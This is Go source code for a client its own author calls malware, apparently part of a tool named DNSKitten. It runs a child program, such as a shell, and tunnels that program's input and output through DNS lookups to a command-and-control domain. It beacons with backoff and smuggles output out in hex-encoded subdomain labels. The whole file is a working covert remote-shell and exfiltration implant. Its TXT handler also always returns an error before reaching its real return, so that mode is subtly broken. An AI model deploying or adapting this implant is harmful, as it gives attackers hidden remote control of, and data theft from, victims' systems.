// client (malware) for DNSKitten
package main

/*
 * client.go
 * Client for dnskitten
 * By J. Stuart McMurray
 * Created 20180126
 * Last Modified 20180128
 */

import (
	"context"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	// DEFSERVERPORT is the default DNS server port
	DEFSERVERPORT = "53"

	// BUFLEN controls how much data is buffered
	BUFLEN = 10240
)

var (
	// PID is added to requests to prevent caching
	PID = os.Getpid()
	// COUNTER is added to requests to prevent caching
	COUNTER uint
	// COUNTERLOCK prevents races on COUNTER
	COUNTERLOCK = &sync.Mutex{}

	// BACKGROUND is the empty context
	BACKGROUND = context.Background()
)

func main() {
	var (
		domain = flag.String(
			"domain",
			"",
			"Base domain `name`",
		)
		server = flag.String(
			"server",
			"",
			"If set, this `address` is sent DNS queries",
		)
		qType = flag.String(
			"qtype",
			"IP",
			"DNS query `type`; must be IP (for A/AAAA) or TXT",
		)
		rLen = flag.Uint(
			"olen",
			8,
			"Number of `bytes` to send in output queries",
		)
		bMin = flag.Duration(
			"min",
			time.Nanosecond,
			"Minimum idle input beacon `interval`",
		)
		bMax = flag.Duration(
			"max",
			time.Minute,
			"Maximum idle input beacon `interval`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options] [program [args...]]

Serves as a client (malware) for DNSKitten.  Spawns a child process, and
proxies the process's stdio via DNS.

Although DNSKitten supports multiple types of records, this program only will
perform queries for A/AAAA (it'll try both with -qtype IP) and TXT.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Make sure QType is supported */
	switch *qType {
	case "IP", "TXT": /* Ok */
	default:
		fmt.Fprintf(
			os.Stderr,
			"QType %q unsupported.  Please use -qtype IP "+
				"or -qtype TXT\n",
		)
		os.Exit(2)
	}

	/* Only can send 31 bytes back */
	if 31 < *rLen {
		fmt.Fprintf(
			os.Stderr,
			"Output queries must have <= 31 bytes of "+
				"output (-olen 31)\n",
		)
		os.Exit(3)
	}

	/* Start child process if we have one */
	var (
		c2Stream     io.WriteCloser /* C2 -> stdio or child */
		outputStream io.Reader      /* child or stdio -> C2 */
		err          error
	)
	if 0 != flag.NArg() {
		c2Stream, outputStream, err = startChild(flag.Args()...)
		if nil != err {
			fmt.Fprintf(
				os.Stderr,
				"Unable to start child process %q: %v\n",
				flag.Args(),
				err,
			)
			os.Exit(1)
		}
		log.Printf("Started child: %q", flag.Args())
	} else {
		c2Stream = os.Stdout
		outputStream = os.Stdin
	}

	/* Make resolver which points to proper server or default */
	resolver := makeResolver(*server)

	/* Get input from C2 server */
	go proxyC2(c2Stream, resolver, *domain, *qType, *bMin, *bMax)

	/* Send output to C2 server */
	proxyOutput(outputStream, resolver, *domain, *qType, *rLen)

	log.Printf("Done.")
}

/* startChild starts a child and returns streams for c2 (to the child) and
output (from the child) */
func startChild(args ...string) (io.WriteCloser, io.Reader, error) {
	if 0 == len(args) { /* Should have already been checked */
		panic("not enough args")
	}
	/* Roll child */
	c := exec.Command(args[0], args[1:]...)
	ip, err := c.StdinPipe()
	if nil != err {
		return nil, nil, err
	}
	op, err := c.StdoutPipe()
	if nil != err {
		return nil, nil, err
	}
	ep, err := c.StderrPipe()
	if nil != err {
		return nil, nil, err
	}

	/* Start child */
	if err := c.Start(); nil != err {
		return nil, nil, err
	}

	/* Mux stdout and stderr */
	pr, pw := io.Pipe()
	wg := &sync.WaitGroup{}
	wg.Add(2)
	go func() {
		defer wg.Done()
		_, err := io.Copy(pw, op)
		if nil != err {
			pw.CloseWithError(err)
		}
	}()
	go func() {
		defer wg.Done()
		_, err := io.Copy(pw, ep)
		if nil != err {
			pw.CloseWithError(err)
		}
	}()
	go func() {
		wg.Wait()
		pw.Close()
	}()

	return ip, pr, nil
}

/* makeResolver returns a *net.Resolver using server as the DNS server if
server is not the empty string.  It uses the default resolver otherwise. */
func makeResolver(server string) *net.Resolver {
	/* Default resolver if there's no server */
	if "" == server {
		return net.DefaultResolver
	}
	/* Make sure the server has a port */
	if _, p, e := net.SplitHostPort(
		server,
	); nil != e || "" == p {
		server = net.JoinHostPort(server, DEFSERVERPORT)
	}
	/* Roll a resolver */
	return &net.Resolver{
		PreferGo: true,
		Dial: func(
			ctx context.Context,
			network string,
			address string,
		) (net.Conn, error) {
			return net.Dial(network, server)
		},
	}
}

/* proxyC2 makes requests of the given type via resolver for the given domain
between bMin and bMax.  It writes received bytes to c2Stream. */
func proxyC2(
	c2Stream io.WriteCloser,
	resolver *net.Resolver,
	domain string,
	qtype string,
	bMin time.Duration,
	bMax time.Duration,
) {
	defer c2Stream.Close()

	var (
		st = bMin /* Sleep Time */
		b  []byte /* C2 buffer */

		/* Query function */
		qf        func(*net.Resolver, string) ([]byte, error)
		err, werr error
	)

	/* 0 sleep time causes problems with the exponential backoff.  A sleep
	time of a nanosecond should be functionally identical. */
	if 0 == st {
		st = 1
	}

	/* Work out which query function to use */
	switch qtype {
	case "IP":
		qf = c2IP
	case "TXT":
		qf = c2TXT
	default:
		log.Panicf("unknown qtype %q", qtype)
	}

	/* Beacon, send data to c2Stream */
	for {
		/* Get some c2 comms */
		COUNTERLOCK.Lock()
		qs := fmt.Sprintf("%x-%x.%v", COUNTER, PID, domain)
		COUNTER++
		COUNTERLOCK.Unlock()
		b, err = qf(resolver, qs)

		/* If we have data at all, write it */
		if 0 != len(b) {
			if _, werr = c2Stream.Write(b); nil != werr {
				log.Printf("C2 error: %v", werr)
				return
			}
			/* Reset sleep timer if we got data */
			st = bMin
		}
		if nil != err && !strings.HasSuffix(
			err.Error(),
			": no such host",
		) {
			log.Printf("Beacon error: %v", err)
		}

		/* Wait until next beacon */
		time.Sleep(st)
		/* Sleep more next time */
		st *= 2
		if st > bMax {
			st = bMax
		}
	}
}

/* c2IP gets C2 data as an A or AAAA record */
func c2IP(r *net.Resolver, q string) ([]byte, error) {
	/* Perform the query */
	as, err := r.LookupIPAddr(BACKGROUND, q)
	if nil != err {
		return nil, err
	}

	/* If we have more than one answer, someone did something funny */
	if 1 != len(as) {
		return nil, errors.New("excess A/AAAA answers")
	}

	/* String to decode */
	var s string

	/* Try IPv4 first */
	if i := as[0].IP.To4(); nil != i {
		s = string(i[:4])
	} else {
		s = string(as[0].IP)
	}

	/* Decode it */
	return base64.StdEncoding.DecodeString(strings.TrimRight(s, " "))
}

/* c2TXT gets C2 data as a TXT record */
func c2TXT(r *net.Resolver, q string) ([]byte, error) {
	/* Perform the query */
	txts, err := r.LookupTXT(BACKGROUND, q)
	if nil != err {
		return nil, err
	}

	/* Multiple strings means something fishy's going on */
	return nil, errors.New("excess TXT answers")

	return []byte(txts[0]), nil
}

/* proxyOutput sends data from outputStream via the resolver to the domain
in requests of type qType with at most rLen bytes of data. */
func proxyOutput(
	outputStream io.Reader,
	resolver *net.Resolver,
	domain string,
	qType string,
	rLen uint,
) {
	/* This should be validated in main */
	if 31 < rLen {
		panic("output size too large (>31)")
	}

	var (
		b   = make([]byte, rLen) /* Output buffer */
		qf  func(string) error   /* Query function */
		qs  string
		n   int
		err error
	)

	/* Work out query function */
	switch qType {
	case "IP":
		qf = func(s string) error {
			_, err := resolver.LookupIPAddr(BACKGROUND, s)
			return err
		}
	case "TXT":
		qf = func(s string) error {
			_, err := resolver.LookupTXT(BACKGROUND, s)
			return err
		}
	default:
		log.Panicf("unknown qtype %v", qType)
	}

	/* Read output, send it out */
	for {
		/* Get a bit of output */
		n, err = outputStream.Read(b)

		/* Send it off */
		if 0 != n {
			COUNTERLOCK.Lock()
			qs = fmt.Sprintf(
				"%x.%02x-%x.o.%v",
				b[:n],
				COUNTER,
				PID,
				domain,
			)
			COUNTER++
			COUNTERLOCK.Unlock()
			if err := qf(qs); nil != err && !strings.HasSuffix(
				err.Error(),
				": no such host",
			) {
				log.Printf(
					"Error sending output request "+
						"for %v: %v",
					qs,
					err,
				)
			}
		}
		/* If we're at EOF, we're done */
		if io.EOF == err {
			return
		}
		if nil != err {
			log.Fatalf("Error reading output: %v", err)
		}
	}
}
